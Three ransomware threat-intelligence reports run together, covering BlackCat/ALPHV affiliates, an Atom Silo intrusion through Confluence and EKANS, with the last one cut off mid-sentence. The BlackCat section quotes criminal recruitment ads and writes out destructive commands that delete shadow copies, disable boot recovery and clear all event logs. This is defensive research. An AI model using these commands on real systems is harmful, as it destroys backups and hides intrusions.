Ransomware attacks continue to be conducted around\nthe world, with underground forums teeming with posts about selling “access” and hiring\n“penetration testers”. \n\nThere is no doubt in the security community that the former members of DarkSide,\nBlackMatter, and REvil have formed the core of ALPHV, a more mature (due to their\nexperience) and sophisticated affiliate program. Security researchers unofficially call it\nBlackCat for its use of two logos: a black cat and a knife dripping with blood. ALPHV\nmembers later attempted to move away from romanticizing crime by changing the design of\ntheir logo, but the name BlackCat has stuck.\n\nDespite its short history, the group has conducted about 140 attacks worldwide over the\ncourse of six months and has set a new direction for the development of extortion-related\ncrime. Many affiliate programs, such as Hive, started mimicking and adopting the methods\nand approaches of BlackCat. This blog post describes the details of this affiliate program\nand analyzes what exactly affiliates do after obtaining access to the networks of their victims.\n\nINTRO from ALPHV\n\nALPHV started its activity in December 2021, when a campaign to attract new affiliates\nstarted to be advertised on underground forums:\n\n\n\n5/18\n\nDescription of the affiliate program on an underground forum\n\nINTRO\n\nWelcome to our affiliate program.\n\nWe’ve taken into account all the advantages and weaknesses of previous affiliate programs\n\nand are proud to present to you ALPHV, a new generation of ransomware.\n\nAll the software has been developed from scratch, with decentralization of all web resources\n\nensured architecturally. A unique onion domain is generated for every new campaign. Every\naffiliate has access through a unique onion domain (hello lockbit).\n\n\nA proprietary data center for storing file leaks bigger than 100 TB.\n\nTop recovery companies, which have worked with darkside, revil, etc. are already\n\ncollaborating with us.\n\nChat support is available 24/7, but you can negotiate yourself if you’d like.\n\nSECURITY\n\nWe are fully prepared for present-day conditions, complying with all infrastructure and\naffiliate security requirements. Our affiliate program architecturally rules out any connections\nwith forums(hello revil), has algorithms for data self-deletion after a certain time, and has an\nintegrated mixer with an actual break in the chain(not to be confused with Wasabi, BitMix,\nand others), as you get perfectly clean coins from foreign exchanges. Our backend does not\nknow the wallets your coins are sent to. The infrastructure is divided into “nodes”, which are\ninterconnected via an entire network of intermediaries within the onion network and are\nlocated behind NAT+FW.\n\n\nEven after receiving a full-on cmdshell, the attacker cannot reveal the real IP address of the\nserver (hello conti)\n\nACCOUNT\n\nIf your account has not been active for two weeks, it will be locked, then deleted. Inorder to\navoid that, we recommend notifying the admins about vacations, breaks, etc.\n\nRates are dynamic and depend on the size of a single payment for each company, namely:\n\n- Up to $1.5M - 80%\n\n\n\n\n\n\n6/18\n\n- Up to $3.0M - 85%\n- $3M and more - 90%\nIn this campaign, potential affiliates were offered a brand new kind of ransomware family\ndeveloped “from scratch” in the Rust programming language, which is a popular cross-\nplatform programming language for creating secure and effective applications. The use of\nRust to create ransomware was a major event in the world of cybercrime.\n\nDescription of the BlackCat ransomware family\n\nSOFTWARE\n\nThe software has been developed from scratch without using any templates or leaked source\ncodes of other ransomware. You can choose between:\n\n\n4 encryption modes:\n\n-Full - full file encryption. The most secure and the slowest.\n\n\n-Fast - encryption of the first N megabytes. Not recommended, the least secure option, but\nthe fastest.\n\n\n-DotPattern - encryption of N megabytes with an M interval. May function worse than Fast in\nterms of both speed and encryption strength if configured incorrectly.\n\n\n-Auto. Depending on the file type and size, the locker(both in windows and *nix / esxi)\nchooses the most optimal(in terms of the speed / security ratio) strategy for processing files.\n\n\n\n7/18\n\n-SmartPattern - encryption of N megabytes with a percentage interval. By default, it encrypts\nwith 10-megabyte blocks with an interval of 10% of the file starting with the header. The most\noptimal mode in terms of the speed\\encryption strength ratio.\n\n\n2 encryption algorithms:|\n\n-ChaCha20\n\n\n-AES\nIn auto mode, the software determines the presence of hardware support for AES(present in\nall modern processors) and uses it. If there is no AES support, the software encrypts files\nusing ChaCha20.\n\nThe software is cross-platform, i.e., if you mount Windows disks in Linux or vice versa, the\ndecryptor will be able to decrypt files.\nSupported OSs\n\n\n- The entire Windows line from Windows 7 and above (we tested it on 7, 8.1, 10, 11, 2008r2,\n2012, 2016, 2019, 2022 ); XP and 2003 can be encrypted through SMB.\n\n\n- ESXI (tested on 5.5, 6.5, 7.0.2u)\n\n- Debian (tested on 7, 8, 9)\n\n\n- Ubuntu (tested on 18.04, 20.04)\n\n- ReadyNAS, Synology\n\nIt was clear from the very beginning of the new RaaS program that its creators were not new\nto the criminal business and took into account the negative experience of their predecessors,\nnamely the DarkSide, BlackMatter and REvil affiliate programs. After their notorious attacks\nagainst major companies, these groups came under the spotlight of security researchers and\nlaw enforcers, who, together with samples, obtained access to victims’ personal pages\ncontaining correspondence with threat actors, where they often interfered.\n\nInformation about using access tokens\n\nSince binaries have been leaking to analysts lately, and VT premium lets you download\nsamples and get readmes, random people may appear in chats and disrupt negotiations\n(hello darkside), when launching the software you MUST use the flag --access-token.\ncmdline arguments are not passed to AVs, which will ensure that your correspondence with\nthe victim is confidential. For the same reason, every encrypted computer generates a\nunique ID used for dividing chats.\n\n\n\n8/18\n\nThere is a feature for uploading files from the MEGA service, you provide a link to files and\nthey are automatically uploaded to your servers.\n\nThe complete description of all features can be found in the FAQ section.\n\nTo avoid previous mistakes, the BlackCat authors fitted ransomware with a mandatory\ncommand line parameter containing an access token, which is provided by the RaaS\nowners to their affiliates together with their ransomware suite.\n\nThe ransomware uses the access token to calculate determine the access key, which is\nadded to a Tor link for the victim to access their page.\n\nContents of the help text file provided to RaaS affiliates\n\nThis link is saved in the ransom note, which is created as a text file in each catalog with\nencrypted files.\n\nRansom note\n\nWhen victims publish information from their chats, BlackCat affiliates punish them by\nincreasing ransom demands, for example. At the start of their activity, the threat actors were\neven more radical; for instance, they deleted the victim’s encryption keys to intimidate future\n\n\n\n9/18\n\nvictims.\n\nInformation about deleting the encryption keys of a victim published by BlackCat operators\n\n\n\n10/18\n\nVictim’s personal page\n\nExtortion\n\nBlackCat affiliates use the double and triple extortion techniques. Firstly, the stolen\ninformation is published on BlackCat’s dedicated leak site (DLS). Secondly, to mount\npressure on the victim, BlackCat affiliates may threaten to send sensitive data to the victim’s\n\n\n\n11/18\n\ncompetitors, partners, or customers, mass media, law enforcement, etc. Thirdly, the victim\nmay receive threats of a DDoS attack being launched against their infrastructure.\n\nChat with a victim\n\nAt the time of writing, the stolen documents of 93 affected companies that refused to pay a\nransom were published on BlackCat’s DLS. We estimate that the overall number of BlackCat\nvictims since December 2021 is about 140.\n\n\n\n12/18\n\nBlackCat's DLS\n\nThe tactics, techniques and procedures of BlackCat ransomware\naffiliates\n\nTo reconstruct the lifecycle of a BlackCat attack, we use the Unified Ransomware Kill Chain\ndescribed in Incident Response Techniques for Ransomware Attacks.\nGaining Access to the Network\n\nSince a single affiliate program may involve different threat actors, techniques used for\nobtaining initial access may differ. Further, affiliates may use the services of initial access\nbrokers, who sell access to companies’ compromised infrastructures.\n\nAs part of investigating security incidents, we have seen the following techniques:\n\n1\n\nExploiting public-facing applications.\n\nhttps://www.amazon.com/gp/product/B09VCM6FWD/\n\n\n13/18\n\nThis technique gained popularity in 2021 among both affiliates and initial access brokers due\nto a lot of vulnerabilities being discovered that allowed arbitrary code execution in a variety of\napplications. In the case of BlackCat, the attackers exploited a set of vulnerabilities known as\nProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207), which enabled them to\nplace a web shell on a vulnerable Microsoft Exchange server and then conduct post-\nexploitation activities.\n\n2\n\nUsing remote access tools.\n\nAccess via publicly accessible terminal servers remains the most popular technique for\ngaining initial access and BlackCat affiliates used it in some cases. In addition to terminal\nservers, access to the target infrastructure could be gained via a VPN; many organizations\nstill do not use multifactor authentication, which enables ransomware operators to easily use\naccounts whose data have been stolen using stealers, for example.\n\nEstablishing Foothold\n\nHaving obtained initial access, the attackers copy a set of tools (in full or in part) to the\ncompromised host and seek to ensure persistence and gain access to privileged accounts to\nbe able to move across the network.\n\nTo have additional capabilities to access the compromised network, the attackers could use\ntunnels (built using ngrok or gost) or legitimate software (such as TeamViewer or\nScreenConnect).\n\nIn some cases, affiliates used Cobalt Strike, a framework that many are already used to\nseeing when investigating ransomware attacks.\n\n\nIn most incidents, BlackCat affiliates relied on legitimate tools to extract authentication data\nby dumping the LSASS (Local Security Authority Server Service) process. For instance, the\nthreat actors used ProcDump and exploited the MiniDump feature of the legitimate library\ncomsvcs.dll.\n\nSometimes the attackers went beyond LSASS and used various NirSoft tools to extract\nauthentication data from the registry, web browsers, and other storage spaces.\nNetwork Discovery\n\nAffiliates seldom used innovative methods at the data collection stage, relying on classic\ntools. For instance, to scan the network, the attackers used SoftPerfect Network Scanner,\nwhich is another tool many ransomware groups use extensively.\n\nTo collect information about Active Directory, the attackers used ADRecon, a tool that is\npopular among REvil and BlackMatter affiliates.\n\n\n\n14/18\n\nIn addition, the NS tool was used to collect data about available local and network drives.\nThe tool was especially popular with those affiliates that used terminal servers to gain initial\naccess.\nKey Assets Discovery, Network Propagation and Data Exfiltration\n\nWith enough privileges in the target IT infrastructure, the attackers start moving to key\nnodes, which will enable them to download the most important information and do away with\nbackups.\n\nTo move across the network, affiliates may use both perfectly legitimate techniques (such as\nRDP) and noisier ones (e.g., Impacket: wmiexec and smbexec in particular; and Cobalt\nStrike).\n\nPuTTY is often used to gain access to the part of the infrastructure running on Linux.\n\nBefore being exfiltrated, data is put into archives using 7-Zip, then uploaded to the MEGA\nfile sharing service using the Rclone utility. In addition, in some cases affiliates used\nExMatter, an exfiltration tool that has earlier been seen in the arsenal of BlackMatter\naffiliate program members.\nDeployment Preparation\n\nBlackCat ransomware deployment is preceded by the erasure or encryption of available\nbackup copies and collection of additional credentials that would allow the attackers to infect\nthe Linux segment, in addition to Windows.\n\nDespite the detectability of BlackCat samples not being high, some affiliates seek to disable\nantivirus software before moving on to the deployment stage.\nRansomware Deployment\n\nThe propagation of BlackCat in the victim’s IT infrastructure is achieved by either modifying\ngroup policies (which results in a scheduled task being created, on each host, that launches\nthe malicious file) or using PsExec.\n\nThe ransomware is written in Rust. Many researchers rightfully consider BlackCat as one of\nthe most sophisticated ransomware groups out there at the moment. BlackCat programs are\nfeature-rich and offer flexible custom settings due to the use of various configuration data\nand command line arguments.\n\nThere are BlackCat versions for Windows (32bit) and Linux (32bit and 64bit). The 64bit Linux\nversion primarily targets ESXi servers. In March 2022, a new version of BlackCat emerged,\ncalled ALPHV MORPH. On underground forums its authors proudly claimed that thanks to\nobfuscation, antivirus software is practically unable to detect it.\n\n\n\n15/18\n\nDescription of ALPHV MORPHV features on an underground forum\n\nLOCKER\n\n1. We are proud to present ALPHV MORPH. Without going into the spicy details, we inform\nthat the binary is completely cleared every hour. In addition to recrypting calls, stings, and\nother things, the RUST compiler makes it possible to enrich every build with unique runtime\njunk, which in the end yielded fantastic results. At the moment, no AV detects it(not to be\nconfused with edr! we did not test it on sentinel), including defender with the cloud disabled –\nthe binary is not deleted even after the machine is fully encrypted. In test mode so far,\nintentionally(!), it is available to everyone via Build->Obfuscated. In the future, this\nfunctionality will only be available to affiliates with the + status. \n\n\n2. Minor fixes in the locker’s operation.\n\np.s. There is no AV for ESXI yet, but we already have a linux polymorph :) That’s right, linux\nis also morphed every hour just because we can.\n\nIt has been mentioned before that launching BlackCat ransomware requires specifying the\nvalue of an access token in the command line parameter — access-token. In earlier\nversions, whether the token value is correct is not checked in any way, while the access key\nis calculated using the entered token value; the program will be launched and files will be\nencrypted, but accessing the victim’s panel would be impossible. In the ALPHV MORPH\nversion, the first 16 characters of the access token are used as a key to decrypt configuration\ndata, which is why if incorrect data is entered, the ransomware will not start.\n\nTo bypass User Account Control (UAC), BlackCat escalates privileges using the ICMLuaUtil\nCOM interface. In addition, privileges can be escalated using the Masquerade PEB method.\nBlackCat ransomware may attempt to authenticate using stolen credentials contained in\nconfiguration data.\n\n\n\nWhen launched, BlackCat allows symbolic links from a deleted item to local and remote\nitems:\n\n\n\n16/18\n\nfsutil behavior set SymlinkEvaluation R2L:1\n\n\nfsutil behavior set SymlinkEvaluation R2R:1\n\n\nStops IIS by executing the following command:\n\niisreset.exe /stop\n\nDeletes volume shadow copies:\n\nvssadmin.exe Delete Shadows /all /quiet\n\n\nwmic.exe Shadowcopy Delete\n\nDisables recovery in Windows boot menu:\n\nbcdedit /set {default}\n\n\nbcdedit /set {default} recoveryenabled No\n\nClears Windows event logs:\n\nfor /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\"\n\nIn addition, the ransomware ends processes and stops services specified in the\nconfiguration.\n\nIt should be noted that BlackCat for Windows can independently propagate itself in the local\narea network as a network worm. To do so, the legitimate PsExec utility contained in the\nbody of the ransomware is used together with stolen credentials specified in the\nconfiguration.\n\nFile encryption is multi-threaded. The AES 128 CTR or ChaCha20 algorithm can be used too\nencrypt file contents depending on the settings, with nonce vectors containing 8 or 12 null\nbytes respectively. In addition, various file encryption modes can be used; below are their\nbrief descriptions.\n\n\n\n17/18\n\nAvailable command line parameters\n\nBlackCat configuration data is contained in the body of the ransomware in the JSON format.\nIn earlier BlackCat versions, the configuration data was in plain text, while in the latest\nversions (ALPHV MORPH), it is stored in an encrypted form (AES-128 CTR). For decryption,\nthe first 16 characters of the access token are used as the key. If the characters are entered\nincorrectly, the ransomware will not be able to run due to a configuration data error.\n\nFormatted BlackCat configuration data\n\nIt must be noted that despite some of the group’s methods being sophisticated, many tactics,\ntechniques and procedures employed by BlackCat affiliates can be easily detected, which\nindicates serious flaws in organizations’ security systems as well as a shortage of skilled\n\n\n\n18/18\n\nsecurity specialists.\n\nAdditional information\n\nMITRE ATT&CK\n\nRansomware Uncovered\n\n2021/2022\n\nThe well-known complete guide to the latest tactics, techniques, and procedures of\nransomware operators based on MITRE ATT&CK®\n\nDownload the report\n\nhttps://github.com/rivitna/Malware/tree/main/BlackCat",

The sophisticated attack, which took place over\ntwo  days , was made possible by an earlier initial access leveraging  a recently revealed\nvulnerability in Atlassian’s Confluence collaboration software.\n\nWhile the ransomware itself is virtually identical to LockFile, the intrusion that made the\nransomware attack possible made use of several novel techniques that made it extremely\ndifficult to investigate, including the side-loading of malicious dynamic-link libraries tailored to\ndisrupt endpoint protection software.\n\nThe incident offers evidence of how dangerous publicly disclosed security vulnerabilities in\nInternet-facing software packages can be when left unpatched even for a relatively short\nperiod. Concurrent with the ransomware attack, Sophos responders found that the\nConfluence vulnerability had also been exploited by a crypto miner.\n\nThe investigation by the Rapid Response team offered us an opportunity to perform the first\nin-depth look at the tools, techniques and practices of the Atom Silo group. The actors\ndeploying the ransomware used well-worn techniques in new ways, and made significant\nefforts to evade detection prior to launching the ransomware.\n\nCompromise and lateral movement\n\nhttps://news.sophos.com/en-us/2021/10/04/atom-silo-ransomware-actors-use-confluence-exploit-dll-side-load-for-stealthy-attack/\nhttps://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html\nhttps://news.sophos.com/en-us/2021/08/27/lockfile-ransomwares-box-of-tricks-intermittent-encryption-and-evasion/\n\n\n2/6\n\nThe first stage of the intrusion took place on September 13, 11 days  before the ransomware\nattack unfolded.  The intruder (either the Atom Silo actors themselves, an affiliate or an initial\naccess broker) gained initial access through a Confluence server via an Object-Graph\nNavigation Language (OGNL) injection attack. This code injection on the Confluence server\nprovided a backdoor, via which the attacker was able to drop and execute files for another,\nstealthy backdoor.\n\nThe payload dropped for the second backdoor consisted of three files. One of them was a\nlegitimate, signed executable from a third-party software provider that is vulnerable to an\nunsigned DLL sideload attack.\n\n[Update, May 2, 2022: We disclosed this vulnerability to McAfee in October 2021; after\nacknowledging the submission, we received no further information from McAfee. The\nexecutable, named mfeann.exe (SHA256:\n07bbd8a80b5377723b13dbb40a01ca44cbc203369f5e5652a25b448e27ca108c) is a\ncomponent of McAfee VirusScan Enterprise responsible for scan event creation and logging.\nThe file was previously reported to VirusTotal by other parties as being connected to\nmalware detections dating back as far as 2017.]\n\nThe malicious DLL spoofs a library required by the executable and is placed in the same\nfolder on the targeted server as the vulnerable .exe. This attack technique, known as DLL\nsearch order hijacking (ATT&CK T1574.001), is a well-worn technique recently observed in\nLockFile ransomware attacks leveraging the ProxyShell vulnerability.\n\nThe DLL’s main role is decrypting and loading the backdoor from the third file, mfc.ini. The\nloaded code then connects to one of several stored hostnames (in this case,\nupdate.ajaxrenew[.]com) over TCP/IP port 80. The code appears similar to that of a Cobalt\nStrike Beacon. Once loaded, the backdoor allowed for remote execution of Windows shell\ncommands through the Windows Management Interface (WMI), in the style of SecureAuth\nCorp.’s WMIexec penetration testing tool.\n\nFrom this point, the intruder began lateral movement. Within five hours, they had\ncompromised several additional servers. Using a single compromised administrative\naccount, the attackers copied and executed the backdoor binaries using WMI.\n\nAt least some of the work was done using a self-deleting Windows batch file named\nhowtorun.bat. The backdoor files were copied and launched on each additional server; in at\nleast one case, the backdoor was then installed on the targeted servers as a service named\n“WindowsUpdate,” executed using the vulnerable legitimate executable, to provide\npersistence. But otherwise, backdoors were executed directly from WMI.\n\nOn the third day of the intrusion, via a batch file named logs.bat, the intruder did some\nadditional discovery, fetching information from the security logs to check for user logons and\nlogoffs, account lockouts, the assignment of special privileges to a logon, and use of\n\nhttps://github.com/h3v0x/CVE-2021-26084_Confluence/blob/main/Confluence_OGNLInjection.py\nhttps://attack.mitre.org/techniques/T1574/001/\nhttps://blog.cyble.com/2021/08/25/lockfile-ransomware-using-proxyshell-attack-to-deploy-ransomware/\nhttps://www.cobaltstrike.com/help-beacon\nhttps://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py\n\n\n3/6\n\nsensitive privileges. They also collected more information about the local network,\ncompressing it into a zipped file for exfiltration.\n\nDuring this time, the unrelated coin miner malware was implanted by another actor using the\nConfluence vulnerability.\n\nExfiltration and effect\n\nOn September 24, the ransomware actors began their own discovery and exfiltration efforts,\nchecking the local volumes attached to an important server and then checking its history of\nRemote Desktop sessions. Using RDP, the ransomware gang then went hands-on-keyboard,\ndropping and executing the RClone utility to copy data off the server to a Dropbox account\nfrom several directories. The process was repeated on another server.\n\nSoon after the exfiltration was complete, the intruders connected to the domain controller\nand dropped their all-in-one attack executable. There were two variants of the attack\nexecutable used in the attack; both executables carry the following files packed as\nresources:\n\nautoupdate.exe (the ransomware, detected as Troj/Ransom-GKL).\nautologin.exe, a Kernel Driver Utility hacktool (detected by Sophos as ATK/KDUtil-A).\nautologin.sys, a driver targeting Sophos services, including the file scanning service\n(now detected as Troj/KillAV-IT).\ndrv64.dll, a Kernel Driver Utility hacktool database (detected by Sophos as ATK/KDUtil-\nA), previously reported as part of a LockFile ransomware attack using the PetitPotam\nexploit.\n\nThe attackers used autologin.exe to “map” the autologin.sys driver to the kernel, using the\ndatabase of vulnerable drivers to find an available exploit. Once loaded, autologin.sys was\nable to bypass protections against shutting down endpoint protection services.\n\nThe attack executables performed a search for all the domain controllers on a network. They\nthen push the four payload files to the \\netlogon folder of each domain server, and create a\nbatch file (autologin.bat or autologin1.bat, in this case). The main difference between the two\nis how that batch file is deployed — the first used in the attack (named FuckGPO.exe in this\ncase) created a scheduled task XML file to carry out the attack, while the second (2.exe)\ncreates a service that establishes persistence. The first version is executed on the domain\ncontroller; the second is launched as a service called “Update” on all domain-connected\nsystems via a Global Policy Object.\n\nThe batch file executed the kernel driver to disrupt endopoint protection, and then launched\nthe ransomware.While the attack file triggered alerts when dropped on the domain server,\nthe ransomware actors used the kernel hacktool to disable Sophos’ file scanning service.\nThis generated an alert as well, but further detection and quarantining of files was disabled.\n\nhttps://github.com/hfiref0x/KDU\n\n\n4/6\n\nIntercept X’s CryptoGuard detected the ransomware , but the attackers then subsequently\nused the secondary attack executable, dropped into the Desktop folder, to disrupt the\nprotection and again launch the ransomware with an updated GPO.\n\nThe ransomware executable itself connected to a remote URL\n(hxxp://139[.]180[.]184[.]147:45532/fake.php), and started encrypting files in a similar fashion\nto LockFile, adding a .ATOMSILO extension to encrypted files. The ransomware dropped a\nransom note formatted in HTML, with instructions on how to contact Atom Silo’s operators.\n\nThe Atom Silo ransom note. \n\nhttps://news.sophos.com/en-us/2021/08/27/lockfile-ransomwares-box-of-tricks-intermittent-encryption-and-evasion/\nhttps://news.sophos.com/wp-content/uploads/2021/09/atomsilo-ransom-1.png\n\n\n5/6\n\nThe Atom Silo “blog.” The group has “rules” similar to DarkSide and BlackMatter.\nAll communications with the operators are over email through an account on atomsilo.com.\nThat domain is registered through NameSilo LLC; the mail server is hosted in Hong Kong by\nthe hosting provider Dataplugs.\n\nThe patch pacing problem\n\nThe initial point of compromise in this attack was a vulnerability that was only public for about\nthree weeks at the time. For many organizations, keeping up with the pace of patching can\nbe a challenge in the best of times—and the effects of lock-down and other recent stressors\naffecting staff availability are only making keeping up with patches more difficult.\n\nRansomware operators and other malware developers are becoming very adept at taking\nadvantage of these gaps, jumping on published proof of concept exploits for newly-revealed\nvulnerabilities and weaponizing them rapidly to profit off them—as demonstrated by the\nevidence of two separate threat actors finding and exploiting the vulnerable Confluence\nserver involved in this incident. If the ransomware attack had not been discovered, the\ncryptocurrency miner on the server may have gone undiscovered.\n\nTo reduce the threat, organizations need to both ensure that they have robust ransomware\nand malware protection in place, and are vigilant about emerging vulnerabilities on Internet-\nfacing software products they operate on their networks. Shifting some products to vendor-\n\nhttps://news.sophos.com/wp-content/uploads/2021/09/atomsilo-onion-2.png\nhttps://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html\n\n\n6/6\n\nhosted software-as-a-service may mitigate some of these risks, as vendors typically patch\nvulnerabilities in their own deployments of software faster than they can be deployed by on-\npremises customers, but this is not a panacea.\n\nAdditionally, abuse of legitimate but vulnerable software components through DLL side-\nloading and other methods has long been a technique used by attackers with a wide range of\ncapabilities, and it has filtered down to the affiliates of ransomware operators and other\ncybercriminals. While abuse of some of these legitimate, signed components is well-enough\nknown to defend against, the supply of alternative vulnerable executables is likely deep.\nSpotting legitimate executables that exist outside of the context of the products they are\nsupposed to be part of requires vigilance—and vulnerability disclosure by the vendors they\ncome from.\n\nUnder these conditions, organizations’ best defenses include full deployment of malware\nprotection on servers and endpoint devices, and that products are monitored to catch attacks\nthat trigger detections or alerts before an attacker with administrative access can defeat\nprotections. (Sophos products, including Intercept X, provide a number of protections against\nthese types of attacks.) Organizations are also encouraged to have effective data backup\npractices and business continuity plans, regardless of their size, to ensure that they can\nsurvive attacks that leverage rapidly exploited vulnerabilities such as those revealed in\nConfluence and Microsoft Exchange this year.\n\nA list of indicators of compromise for this attack is available on the SophosLabs Github page.\n\nSophosLabs would like to acknowledge Bill Kearny of Sophos MTR’s Rapid\nResponse team, and\n\nKrisztián Diriczi, Kajal Katiyar, Chaitanya Ghorpade and Rahil Shah of SophosLabs for their\ncontributions to this report.\n\nhttps://github.com/sophoslabs/IoCs/blob/master/ransomware_atomsilo.csv",

Impact and operational assessments\nof ransomware in this report derive from responding and protecting these environments\ndaily.\n\nDragos published a previous version of this report for threat intelligence customers on 14\nJanuary 2020. Due to the public interest in this ransomware, we are releasing the full report\nto the public.\n\nNOTE: Since publication, Dragos was informed by an independent researcher that EKANS\nactually contains a far larger list of processes to kill than initially understood.[a] Further\nexamination shows the process list overlaps with the MegaCortex list cited earlier in this\npost, indicating significant continuity between these samples, with EKANS only adding\nobfuscation and encoding to make the process list non-obvious to researchers.[b] Based on\nthis information, EKANS remains an interesting threat to ICS-specific processes but\nappears to be a continuation of a trend dating back to at least the summer of 2019.\n\n[a]W3ndige – Twitter\n\n[b] Script and the decoded strings from the EKANS/Snake ransomware – GitHubGist\n\nExecutive Summary\n\nEKANS ransomware emerged in mid-December 2019, and Dragos published a private\nreport to Dragos WorldView Threat Intelligence customers early January 2020. While\nrelatively straightforward as a ransomware sample in terms of encrypting files and\ndisplaying a ransom note, EKANS featured additional functionality to forcibly stop a number\nof processes, including multiple items related to ICS operations. While all indications at\npresent show a relatively primitive attack mechanism on control system networks, the\nspecificity of processes listed in a static “kill list” shows a level of intentionality previously\nabsent from ransomware targeting the industrial space. ICS asset owners and operators\nare therefore strongly encouraged to review their attack surface and determine mechanisms\nto deliver and distribute disruptive malware, such as ransomware, with ICS-specific\ncharacteristics.\n\nUpon discovery and investigation, Dragos identified a relationship between EKANS and\nransomware called MEGACORTEX, which also contained some ICS-specific\ncharacteristics. The identification of industrial process targeting within the ransomware\ndescribed in this report is unique and represents the first known ICS-specific ransomware\nvariants.\n\nEKANS underscores the importance for asset owners and operators to achieve visibility into\ntheir assets. By taking stock of available assets and connections within an environment,\nasset owners can understand the potential consequences of an adversary deploying ICS-\n\nhttps://twitter.com/w3ndige/status/1233388947411263492\nhttps://gist.github.com/W3ndige/0e741c4e04555e67b2219b1a2885852c\nhttps://www.dragos.com/resource/asset-visibility-for-ot-infographic/\n\n\n3/17\n\nspecific ransomware against a certain asset, the impact to operations or related processes,\nand take measures to defend against them.\n\nEKANS Background and Discovery\n\nDragos initially learned of a new ransomware variant, called “Snake” or “EKANS”, on 06\nJanuary 2020. [1] After alerting impacted parties and reporting to Dragos WorldView\ncustomers on 14 January 2020, the malware received additional media coverage on 28\nJanuary 2020. [2]\n\nAnalyst Note: Although referred to as both Snake and EKANS in public reporting\n(“EKANS” being “Snake” spelled backwards), Dragos will refer to this malware as EKANS\ndue to the existence of other malware previously discovered and labeled as “Snake” and\nattributed to the Turla threat actor. [3] Any further or future reference to “Snake” by Dragos\nwill refer to Turla-associated activity, while the ransomware variant under discussion will be\nreferenced as EKANS.\n\nWhile investigating EKANS, Dragos observed a list of processes associated with industrial\ncontrol system operations (ICS). The malware was designed to terminate the named\nprocesses on victim machines. This is notable for EKANS because while ransomware has\npreviously victimized ICS environments, prior events all feature IT-focused ransomware that\nspreads into control system environments by way of enterprise mechanisms. [4] Otherwise,\nICS-specific ransomware has mostly included either academic proof of concepts or\nmarketing stunts representing the corpus of activity. [5]\n\nGiven the unique (if limited) nature of EKANS for ICS operations, Dragos provides the\nfollowing analysis.\n\nWith a limited set of ICS-specific malware in existence, EKANS, though\nprimitive, represents an evolution in adversaries targeting control system\nenvironments.\n\nAs a result, even though much recent public reporting on the subject has been hyperbolic in\nnature, the following covers publicly available information on the first known ICS-specific\nransomware examples.\n\nEKANS Ransomware Analysis\n\nEKANS is an obfuscated ransomware variant written in the Go programming language, first\nobserved in commercial malware repositories in late December 2019. The only known,\nrelevant sample has the following characteristics:\n\nFile Name: update.exe\n\nMD5: 3d1cc4ef33bad0e39c757fce317ef82a\n\n\n\n4/17\n\nSHA1: f34e4b7080aa2ee5cfee2dac38ec0c306203b4ac\n\nSHA256: e5262db186c97bbe533f0a674b08ecdafa3798ea7bc17c705df526419c168b60\n\nAnalysis of the binary indicates multiple, custom Go libraries are used to construct and\nensure execution, as shown in Figure 1.\n\nFigure 1: References to Custom Golang Files in EKANS Binary\nOn its own, the binary consists of multiple encoded strings. However, the encoding schema\ncan be identified and reversed, and publicly available analysis was provided as early as 07\nJanuary 2020. [6] Reviewing the encoded strings along with monitoring malware execution\nin a sandbox environment identifies the ransomware’s program flow.\n\nFirst, the malware checks for the existence of a Mutex value, “EKANS”, on the victim. If\npresent, the ransomware will stop with a message “already encrypted!”. Otherwise, the\nMutex value is set and encryption moves forward using standard encryption library\nfunctions. Primary functionality on victim systems is achieved via Windows Management\nInterface (WMI) calls, which begins executing encryption operations and removes Volume\nShadow Copy backups on the victim.\n\nBefore proceeding to file encryption operations, the ransomware force stops (“kills”)\nprocesses listed by process name in a hard-coded list within the encoded strings of the\nmalware. A full list with assessed process function or relationship is provided in Appendix A\n\n\n\n5/17\n\nof this report. While some of the referenced processes appear to relate to security or\nmanagement software (e.g., Qihoo 360 Safeguard and Microsoft System Center), the\nmajority of the listed processes concern databases (e.g., Microsoft SQL Server), data\nbackup solutions (e.g., IBM Tivoli), or ICS-related processes.\n\nICS products referenced include numerous references to GE’s Proficy data historian, with\nboth client and server processes included. [7] Additional ICS-specific functionality\nreferenced includes GE Fanuc licensing server services and Honeywell’s HMIWeb\napplication. [8] Remaining ICS-related items consist of remote monitoring (e.g., historian-\nlike) or licensing server instance such as FLEXNet and Sentinel HASP license managers\nand ThingWorx Industrial Connectivity Suite. [9] As indicated previously, the malware\nperforms no action other than forcibly stopping the referenced process. As such, the\nmalware has no capability to inject commands into or otherwise manipulate ICS-related\nprocesses. However, execution on the right system (e.g., a data historian) would induce a\nloss of view condition within the network.\n\nFiles are renamed after encryption by appending a random five character (upper- and\nlower-case letters) to the original file extension. For example, as shown in Figure 2, Python\nPYD files are encrypted and additional characters added to the PYD extension.\n\nFigure 2: EKANS Encryption Results\n\n\n\n6/17\n\nFollowing process stop and encryption actions, EKANS drops a ransom note to the root of\nthe system drive (typically C:\\) and the active user’s desktop. The ransom note is provided\nin Figure 3.\n\nFigure 3: EKANS Ransom Note\n User access to the encrypted system is maintained throughout the process, and the system\n\ndoes not reboot, shutdown, or close remote access channels. This differentiates EKANS\nfrom more disruptive ransomware such as the LockerGoga variant deployed at Norsk Hydro\nin March 2019. [10] The email address in the ransomware uses a privacy-focused email\nservice, similar to Protonmail, called CTemplar. [11]\n\nAnalyst Note: The response email, bapcocryp[AT]ctemplar[.]com, appears similar to\nBapco, the Bahrain state oil company. [12] Recent reporting claims that Bapco was the\nvictim of the late December 2019 ZeroCleare wiper variant Dustman. [13] While the email\naddress is provocative in light of this news, the EKANS sample appears unrelated to the\nDustman event. The EKANS sample was first identified in a commercial virus repository on\n26 December 2019, while the Dustman event took place on 29/30 December 2019. One\npossibility is that EKANS was in fact used at Bapco in an incident prior to Dustman, while\nanother is that current public reporting is confusing the Dustman incident (which all\navailable information indicates is focused on Saudi Arabia) with a widespread and\npotentially disruptive ransomware event at Bapco occurring around the same time. In either\ncase, any links between EKANS, the Bapco incident, and the Dustman wiper appear\ncircumstantial given available evidence.\n\nEKANS possesses no built-in propagation or spreading mechanism. The malware must\ninstead be launched either interactively or via script to infect a host. As such, EKANS\nfollows a trend observed in other ransomware families such as Ryuk and MEGACORTEX\namong others, where self-propagation is avoided in favor of performing large-scale\ncompromise of an enterprise network. Once achieved, ransomware can be seeded and\nscheduled throughout the network via 